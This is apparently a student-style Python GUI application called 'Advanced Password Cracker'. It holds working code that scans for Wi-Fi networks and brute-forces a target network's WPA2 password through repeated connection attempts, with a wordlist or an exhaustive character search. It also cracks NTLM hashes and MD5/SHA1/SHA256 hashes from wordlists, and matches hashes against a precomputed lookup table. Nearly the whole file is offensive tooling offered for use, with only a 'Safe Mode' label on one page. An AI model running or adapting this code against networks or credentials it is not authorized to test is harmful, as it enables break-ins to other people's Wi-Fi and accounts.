import tkinter as tk 
from tkinter import filedialog, messagebox, scrolledtext
from tkinter.scrolledtext import ScrolledText
import hashlib
import json
import threading
import time
import os
import pywifi # pyright: ignore[reportMissingImports]
from pywifi import const   # pyright: ignore[reportMissingImports]
from PIL import Image, ImageTk # pyright: ignore[reportMissingImports]
from passlib.hash import nthash  # type: ignore
import itertools
import string
import pathlib
import webbrowser
import requests #type: ignore
from io import BytesIO
import queue
import binascii


# ============= ABOUT TOOL =============
def about_tool():
    file_path = os.path.join(os.getcwd(), "about.html")
    webbrowser.open_new_tab('file://' + os.path.realpath(file_path))

# ----------------- Wi-Fi Network Scanning -----------------
def scan_networks(output_text):
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(3)
        scan_results = iface.scan_results()
        output_text.insert(tk.END, "Available Wi-Fi Networks:\n")
        for network in scan_results:
            output_text.insert(
                tk.END, f"- SSID: {network.ssid} | BSSID: {network.bssid}\n"
            )
        output_text.insert(tk.END, "\nScan complete.\n")
        output_text.see(tk.END)
    except Exception as e:
        output_text.insert(tk.END, f"Error scanning networks: {str(e)}\n")
        output_text.see(tk.END)

# ----------------- Brute Force Logic (Wi-Fi) -----------------
def brute_force_wifi(ssid, output_text, stop_flag, wordlist=None, min_length=8, max_length=14):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    def try_password(password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(3)
        if iface.status() == const.IFACE_CONNECTED:
            iface.disconnect()
            return True
        return False

    output_text.insert(tk.END, f"Starting brute-force on {ssid}...\n")

    if wordlist:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as wl:
            for line in wl:
                if stop_flag["stop"]:
                    output_text.insert(tk.END, "\nAttack stopped by user.\n")
                    return
                password = line.strip()
                output_text.insert(tk.END, f"Trying password: {password}\n")
                output_text.see(tk.END)
                if try_password(password):
                    output_text.insert(tk.END, f"\n[+] Password found: {password}\n")
                    return
    else:
        chars = string.ascii_letters + string.digits + string.punctuation
        for length in range(min_length, max_length + 1):
            for attempt in itertools.product(chars, repeat=length):
                if stop_flag["stop"]:
                    output_text.insert(tk.END, "\nAttack stopped by user.\n")
                    return
                password = ''.join(attempt)
                output_text.insert(tk.END, f"Trying password: {password}\n")
                output_text.see(tk.END)
                if try_password(password):
                    output_text.insert(tk.END, f"\n[+] Password found: {password}\n")
                    return
    output_text.insert(tk.END, "\n[-] Password not found.\n")

# ----------------- Wi-Fi Cracker Page -----------------
class WiFiPage:
    def __init__(self, parent):
        self.parent = parent  # Reference to main window
        self.window = tk.Toplevel(parent)
        self.window.title("Wi-Fi Cracker")
        self.window.geometry("700x500")
        self.window.config(bg="#16a085")

        tk.Label(
            self.window, text="Wi-Fi Cracker",
            font=("Arial", 16, "bold"), fg="white", bg="#16a085"
        ).pack(pady=10)

        # Output area
        self.output = ScrolledText(self.window, wrap=tk.WORD, height=15, width=80)
        self.output.pack(pady=10)

        self.stop_flag = {"stop": False}

        # Scan Networks button
        tk.Button(
            self.window, text="Scan Networks", bg="#2980b9", fg="white",
            command=lambda: threading.Thread(target=scan_networks, args=(self.output,)).start()
        ).pack(pady=5)

        # SSID Entry
        tk.Label(self.window, text="Enter SSID:", fg="white", bg="#16a085").pack()
        self.ssid_entry = tk.Entry(self.window, width=40)
        self.ssid_entry.pack(pady=5)

        # Frame for Wordlist and Start buttons
        button_frame_top = tk.Frame(self.window, bg="#16a085")
        button_frame_top.pack(pady=5)
        tk.Button(
            button_frame_top, text="Choose Wordlist", bg="#8e44ad", fg="white",
            command=self.load_wordlist, width=20
        ).grid(row=0, column=0, padx=5)
        tk.Button(
            button_frame_top, text="Start Brute Force", bg="#e67e22", fg="white",
            command=self.start_bruteforce, width=20
        ).grid(row=0, column=1, padx=5)

        # Frame for Stop and Clear buttons
        button_frame_bottom = tk.Frame(self.window, bg="#16a085")
        button_frame_bottom.pack(pady=5)
        tk.Button(
            button_frame_bottom, text="Stop Attack", bg="#e74c3c", fg="white",
            command=self.stop_attack, width=20
        ).grid(row=0, column=0, padx=5)
        tk.Button(
            button_frame_bottom, text="Clear Output", bg="#c0392b", fg="white",
            command=lambda: self.output.delete(1.0, tk.END), width=20
        ).grid(row=0, column=1, padx=5)

        # Centered Back button
        tk.Button(
            self.window, text="Back", bg="#34495e", fg="white",
            command=self.window.destroy, width=20
        ).pack(pady=15)

        self.wordlist_path = None

    def load_wordlist(self):
        self.wordlist_path = filedialog.askopenfilename(
            title="Select Wordlist", filetypes=[("Text Files", "*.txt")]
        )
        if self.wordlist_path:
            self.output.insert(tk.END, f"[*] Wordlist loaded: {self.wordlist_path}\n")

    def start_bruteforce(self):
        ssid = self.ssid_entry.get()
        if not ssid:
            messagebox.showwarning("Input Required", "Please enter the SSID.")
            return
        self.stop_flag["stop"] = False
        threading.Thread(
            target=brute_force_wifi,
            args=(ssid, self.output, self.stop_flag, self.wordlist_path)
        ).start()

    def stop_attack(self):
        self.stop_flag["stop"] = True
        self.output.insert(tk.END, "\n[!] Stop signal sent to brute-force thread.\n")


# ----------------- Safe Threaded UI Helper  -----------------
class ThreadedUIWorker:
    """
    Helper to run worker threads and safely post strings back to a ScrolledText using a queue.
    """
    def __init__(self, output_widget: ScrolledText):
        self.output = output_widget
        self.queue = queue.Queue()
        self._polling = False

    def start_polling(self):
        if not self._polling:
            self._polling = True
            self._poll_queue()

    def _poll_queue(self):
        try:
            while True:
                msg = self.queue.get_nowait()
                self.output.insert(tk.END, msg)
                self.output.see(tk.END)
        except queue.Empty:
            pass
        if self._polling:
            self.output.after(200, self._poll_queue)

    def stop_polling(self):
        self._polling = False

    def post(self, text: str):
        self.queue.put(text)


# ---------------- NTLM Page ----------------

class NTLMPage:
    def __init__(self, parent):
        self.window = tk.Toplevel(parent)
        self.window.title("NTLM Hash Cracker - Super Fast")
        self.window.geometry("700x550")
        self.window.config(bg="#3498db")

        tk.Label(self.window, text="NTLM Hash Cracker", font=("Arial", 16, "bold"),
                 fg="white", bg="#3498db").pack(pady=10)

        self.output = ScrolledText(self.window, wrap=tk.WORD, height=20, width=80)
        self.output.pack(pady=10)

        self.targets_path = None
        self.wordlist_path = None
        self.stop_flag = False

        # File selection buttons
        btn_frame = tk.Frame(self.window, bg="#3498db")
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="Upload Targets File", bg="#2980b9", fg="white",
                  command=self.upload_targets, width=20).grid(row=0, column=0, padx=5)
        tk.Button(btn_frame, text="Choose Wordlist", bg="#8e44ad", fg="white",
                  command=self.choose_wordlist, width=20).grid(row=0, column=1, padx=5)

        # Start/Stop buttons
        run_frame = tk.Frame(self.window, bg="#3498db")
        run_frame.pack(pady=5)
        tk.Button(run_frame, text="Start Crack", bg="#e67e22", fg="white",
                  command=self.start_crack, width=20).grid(row=0, column=0, padx=5)
        tk.Button(run_frame, text="Stop Crack", bg="#e74c3c", fg="white",
                  command=self.stop_crack, width=20).grid(row=0, column=1, padx=5)

        # Back and clear buttons
        back_frame = tk.Frame(self.window, bg="#3498db")
        back_frame.pack(pady=5)
        tk.Button(back_frame, text="Back", bg="#34495e", fg="white",
                  command=self.close, width=20).pack()
        tk.Button(self.window, text="Clear Output", bg="#c0392b", fg="white",
                  command=lambda: self.output.delete(1.0, tk.END)).pack(pady=5)

    def log(self, msg):
        self.output.insert(tk.END, msg + "\n")
        self.output.see(tk.END)
        self.output.update_idletasks()

    def upload_targets(self):
        path = filedialog.askopenfilename(title="Select Targets File", filetypes=[("Text Files", "*.txt")])
        if path:
            self.targets_path = path
            self.log(f"[*] Targets file loaded: {path}")

    def choose_wordlist(self):
        path = filedialog.askopenfilename(title="Select Wordlist File", filetypes=[("Text Files", "*.txt")])
        if path:
            self.wordlist_path = path
            self.log(f"[*] Wordlist loaded: {path}")

    def start_crack(self):
        if not self.targets_path or not self.wordlist_path:
            messagebox.showwarning("Missing Input", "Please upload both targets file and wordlist.")
            return
        self.stop_flag = False
        threading.Thread(target=self.crack_ntlm, daemon=True).start()

    def stop_crack(self):
        self.stop_flag = True
        self.log("[!] Stop signal sent. Cracking will terminate shortly...")

    def crack_ntlm(self):
        try:
            if not os.path.exists(self.targets_path) or not os.path.exists(self.wordlist_path):
                self.log("[-] Error: One of the files does not exist.")
                return

            with open(self.targets_path, "r", encoding="utf-8", errors="ignore") as f:
                targets = {line.strip().lower() for line in f if line.strip()}

            matches = {}
            checked = 0

            with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as wf:
                for line in wf:
                    if self.stop_flag:
                        self.log("[!] Cracking stopped by user.")
                        break
                    password = line.strip()
                    if not password:
                        continue

                    checked += 1
                    candidate_hash = nthash.hash(password).lower()
                    if candidate_hash in targets:
                        matches[candidate_hash] = password
                        self.log(f"[+] Found: {password} -> {candidate_hash}")

                    if checked % 10000 == 0:
                        self.log(f"[*] Checked {checked} passwords so far...")

            self.log(f"Total candidates checked: {checked}")
            if matches:
                self.log(f"[+] Matches found ({len(matches)}):")
                for h, pwd in matches.items():
                    self.log(f"    {pwd} -> {h}")
            else:
                self.log("[-] No matches found.")

        except Exception as e:
            self.log(f"[!] Error: {str(e)}")

    def close(self):
        self.stop_flag = True
        self.window.destroy()
        
# ---------------- UNIVERSAL HASH CRACKER ----------------
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import hashlib
import threading

class UniversalHashCrackerPage:
    def __init__(self, parent):
        self.parent = parent
        self.stop_flag = False
        self.checked_count = 0

        win = tk.Toplevel(parent)
        win.title("Universal Hash Cracker (Auto-detect MD5/SHA1/SHA256)")
        win.geometry("820x720")

        # --- Hash Input ---
        tk.Label(win, text="Enter Hash (or upload hash file):", font=("Arial", 12, "bold")).pack(pady=5)
        self.hash_entry = tk.Entry(win, width=95, font=("Courier", 11))
        self.hash_entry.pack(pady=5)

        # --- Upload buttons ---
        upload_frame = tk.Frame(win)
        upload_frame.pack(pady=8)
        tk.Button(upload_frame, text="Upload Hash File", bg="#64b9ff", fg="white",
                  font=("Arial", 11, "bold"), command=self.load_hash_file).grid(row=0, column=0, padx=10)
        tk.Button(upload_frame, text="Upload Wordlist", bg="#75c0fd", fg="white",
                  font=("Arial", 11, "bold"), command=self.load_wordlist).grid(row=0, column=1, padx=10)

        # --- Action Buttons ---
        btn_frame = tk.Frame(win)
        btn_frame.pack(pady=12)
        tk.Button(btn_frame, text="Start Crack", bg="#27ae60", fg="white",
                  font=("Arial", 12, "bold"), command=self.start_crack).grid(row=0, column=0, padx=8)
        tk.Button(btn_frame, text="Stop Crack", bg="#c0392b", fg="white",
                  font=("Arial", 12, "bold"), command=self.stop_crack).grid(row=0, column=1, padx=8)
        tk.Button(btn_frame, text="Clear Output", bg="#f39c12", fg="black",
                  font=("Arial", 12, "bold"), command=self.clear_output).grid(row=0, column=2, padx=8)

        # --- Output log ---
        self.output = scrolledtext.ScrolledText(win, height=15, width=100, font=("Courier", 10))
        self.output.pack(pady=10)

        # --- Final Results ---
        tk.Label(win, text="✅ Cracked Results:", font=("Arial", 13, "bold"), fg="green").pack(pady=3)
        self.results_box = scrolledtext.ScrolledText(win, height=8, width=100, font=("Courier", 10), fg="darkgreen")
        self.results_box.pack(pady=5)

        # --- Checked count ---
        self.count_label = tk.Label(win, text="Checked: 0 passwords", font=("Arial", 12, "bold"), fg="blue")
        self.count_label.pack(pady=5)

        # --- Back Button ---
        tk.Button(win, text="Back", bg="#2980b9", fg="white",
                  font=("Arial", 12, "bold"), command=win.destroy).pack(pady=5)

        # State
        self.wordlist = None
        self.hash_file = None
        self.win = win

    # Load hash file
    def load_hash_file(self):
        self.hash_file = filedialog.askopenfilename(title="Select Hash File", filetypes=[("Text Files", "*.txt")])
        if self.hash_file:
            self.log(f"[*] Hash file loaded: {self.hash_file}")

    # Load wordlist
    def load_wordlist(self):
        self.wordlist = filedialog.askopenfilename(title="Select Wordlist", filetypes=[("Text Files", "*.txt")])
        if self.wordlist:
            self.log(f"[*] Wordlist loaded: {self.wordlist}")

    # Logging helper
    def log(self, msg):
        self.output.insert(tk.END, msg + "\n")
        self.output.see(tk.END)

    # Results helper
    def add_result(self, msg):
        self.results_box.insert(tk.END, msg + "\n")
        self.results_box.see(tk.END)

    # Clear output
    def clear_output(self):
        self.output.delete(1.0, tk.END)
        self.results_box.delete(1.0, tk.END)
        self.count_label.config(text="Checked: 0 passwords")
        self.checked_count = 0

    # Stop flag
    def stop_crack(self):
        self.stop_flag = True
        self.log("[!] Stopping crack process...")

    # Start cracking
    def start_crack(self):
        if not self.wordlist:
            messagebox.showwarning("Missing", "Please upload a wordlist.")
            return
        if not self.hash_entry.get() and not self.hash_file:
            messagebox.showwarning("Missing", "Please enter a hash or upload a hash file.")
            return
        self.stop_flag = False
        self.checked_count = 0
        self.clear_output()
        threading.Thread(target=self.crack, daemon=True).start()

    # Crack logic with auto-detect
    def crack(self):
        # Load target hashes
        targets = []
        if self.hash_file:
            with open(self.hash_file, "r", encoding="utf-8") as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            targets = [self.hash_entry.get().strip()]

        # Load wordlist
        with open(self.wordlist, "r", encoding="utf-8") as f:
            words = [w.strip() for w in f if w.strip()]

        # Supported hash algorithms
        algos = {
            "md5": hashlib.md5,
            "sha1": hashlib.sha1,
            "sha256": hashlib.sha256
        }

        for target in targets:
            self.log(f"\n[*] Cracking hash: {target}")
            found = False
            for word in words:
                if self.stop_flag:
                    self.log("[!] Crack stopped by user.")
                    return

                # Try all algorithms
                match = False
                for name, func in algos.items():
                    hashed = func(word.encode()).hexdigest()
                    if hashed == target:
                        match = True
                        break

                # increment count
                self.checked_count += 1
                self.count_label.config(text=f"Checked: {self.checked_count} passwords")

                self.log(f"Trying: {word}")
                if match:
                    result = f"[+] {target}  →  {word} (detected: {name})"
                    self.log(result)
                    self.add_result(result)
                    found = True
                    break

            if not found:
                self.log(f"[-] Password not found for {target}")
                self.add_result(f"❌ {target} → Not Found")



# ---------------- Rainbow  ----------------
class RainbowPage:
    def __init__(self, parent):
        self.window = tk.Toplevel(parent)
        self.window.title("Rainbow Table Attack (Safe Mode)")
        self.window.geometry("700x500")
        self.window.config(bg="#8e44ad")

        tk.Label(self.window, text="Rainbow Table (Safe) — Hash Lookup",
                 font=("Arial", 16, "bold"), fg="white", bg="#8e44ad").pack(pady=10)

        self.output = scrolledtext.ScrolledText(self.window, wrap=tk.WORD, height=15, width=80)
        self.output.pack(pady=10)

        # Buttons
        tk.Button(self.window, text="Upload Hash File", bg="#2980b9", fg="white",
                  command=self.upload_hashes).pack(pady=5)
        tk.Button(self.window, text="Upload Rainbow JSON", bg="#9b59b6", fg="white",
                  command=self.upload_rainbow_json).pack(pady=5)

        # Row for Start and Stop buttons
        frame = tk.Frame(self.window, bg="#8e44ad")
        frame.pack(pady=5)
        self.start_btn = tk.Button(frame, text="Start Attack", bg="#27ae60", fg="white",
                                   command=self.start_attack, state="disabled")
        self.start_btn.pack(side="left", padx=5)

        self.stop_btn = tk.Button(frame, text="Stop Attack", bg="#e67e22", fg="white",
                                  command=self.stop_attack, state="disabled")
        self.stop_btn.pack(side="left", padx=5)

        tk.Button(self.window, text="Clear Output", bg="#e74c3c", fg="white",
                  command=lambda: self.output.delete(1.0, tk.END)).pack(pady=5)
        tk.Button(self.window, text="Back", bg="#34495e", fg="white",
                  command=self.close).pack(pady=5)

        # Storage
        self.hashes_file = None
        self.rainbow_data = None

        self.attack_thread = None
        self.stop_flag = threading.Event()

    def log(self, msg):
        self.output.insert(tk.END, msg + "\n")
        self.output.see(tk.END)

    def upload_hashes(self):
        file_path = filedialog.askopenfilename(
            title="Select Hash File", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file_path:
            self.hashes_file = file_path
            self.log("[*] Hash file loaded successfully.")
            if self.rainbow_data:
                self.start_btn.config(state="normal")

    def upload_rainbow_json(self):
        file_path = filedialog.askopenfilename(
            title="Select Rainbow JSON File", filetypes=[("JSON Files", "*.json"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    self.rainbow_data = json.load(f)   # {hash: password}
                self.log("[*] Rainbow JSON loaded successfully.")
                if self.hashes_file:
                    self.start_btn.config(state="normal")
            except Exception as e:
                messagebox.showerror("JSON Error", f"Failed to load JSON: {e}")

    def start_attack(self):
        if not self.hashes_file:
            self.log("[!] Please load a Hash file first.")
            return
        if not self.rainbow_data:
            self.log("[!] Please load a Rainbow JSON file first.")
            return

        self.stop_flag.clear()
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.attack_thread = threading.Thread(target=self.rainbow_attack, daemon=True)
        self.attack_thread.start()

    def stop_attack(self):
        self.stop_flag.set()
        self.log("[*] Stop signal sent. Waiting for thread to terminate...")

    def rainbow_attack(self):
        rainbow_table = {str(k).strip(): v for k, v in self.rainbow_data.items()}
        matches = []

        with open(self.hashes_file, "r", encoding="utf-8", errors="ignore") as hf:
            for line in hf:
                if self.stop_flag.is_set():
                    break
                h = line.strip()
                if not h:
                    continue
                if h in rainbow_table:
                    matches.append((h, rainbow_table[h]))

        if matches:
            self.log(f"[+] Matches found ({len(matches)}):")
            for h, pwd in matches:
                self.log(f"    {h} → {pwd}")
        else:
            self.log("[-] No matches found in rainbow attack.")

        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")

    def close(self):
        self.stop_flag.set()
        self.window.destroy()


# ---------------- MAIN INTERFACE ----------------
root = tk.Tk()
root.title("🔐 Advanced Password Cracker")
root.geometry("500x400")

# Background image
bg_image = Image.open("images/background.jpg")
bg_image = bg_image.resize((1500, 1400))
bg_photo = ImageTk.PhotoImage(bg_image)

bg_label = tk.Label(root, image=bg_photo)
bg_label.place(relwidth=1, relheight=1)

# Heading
label = tk.Label(root, text="🔐Advanced Password Cracker",
                 font=("Times New Roman", 24, "bold"))
label.pack(pady=20)

# --- Round Project Info Button ---
canvas = tk.Canvas(root, width=250, height=100, highlightthickness=0)
canvas.pack(pady=10)
round_btn = canvas.create_oval(10, 10, 220, 75, fill="#EAF1EA", outline="blue")
btn_text = canvas.create_text(105, 40, text="Project Info", fill="#000000",
                              font=("Verdana", 18, " italic underline"))
canvas.tag_bind(round_btn, "<Button-1>", lambda e: about_tool())
canvas.tag_bind(btn_text, "<Button-1>", lambda e: about_tool())

# Action Buttons (using Run App logic but styled like interface)
btn_wifi = tk.Button(root, text="Wi-Fi Cracker", bg="#A944F6", fg="#FFFFFF",
                     font=("Arial", 20, "bold"), width=30,
                     command=lambda: WiFiPage(root))
btn_wifi.pack(pady=(110, 5), padx=(300, 0))

btn_ntlm = tk.Button(root, text="NTLM Cracker", bg="#3498db", fg="#FFFFFF",
                     font=("Arial", 20, "bold"), width=30,
                     command=lambda: NTLMPage(root))
btn_ntlm.pack(pady=5, padx=(300, 0))

btn_hash = tk.Button(root, text="Hash Cracker (MD5 / SHA1 / SHA256)", bg="#1264de", fg="#FFFFFF",
                     font=("Arial", 20, "bold"), width=30,
                     command=lambda: UniversalHashCrackerPage(root))
btn_hash.pack(pady=5, padx=(300, 0))

btn_rainbow = tk.Button(root, text="Rainbow Attack", bg="#EFF552", fg="#0F0F14",
                        font=("Arial", 20, "bold"), width=30,
                        command=lambda: RainbowPage(root))
btn_rainbow.pack(pady=5, padx=(300, 0))


root.mainloop()
